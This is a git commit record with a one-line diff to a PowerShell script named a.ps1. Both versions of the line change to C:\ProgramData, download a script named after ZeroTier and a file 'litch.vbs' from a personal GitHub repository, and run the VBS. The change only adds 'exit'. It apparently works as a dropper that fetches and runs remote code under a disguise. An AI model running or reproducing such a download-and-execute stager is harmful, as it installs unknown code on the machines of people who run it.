05e3f7331bc9c838e0d0dc3166592849233f328b
2o2ks <153238359+2o2ks@users.noreply.github.com>
2024-02-13 16:29:23 -0300

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -1,1 +1,1 @@
-cd "C:\ProgramData"; Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier/main/ZeroTier%20v%201.12.2.ps1; Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/lutfica/main/litch.vbs; .\litch.vbs
+cd "C:\ProgramData"; Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier/main/ZeroTier%20v%201.12.2.ps1; Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/lutfica/main/litch.vbs; .\litch.vbs; exit
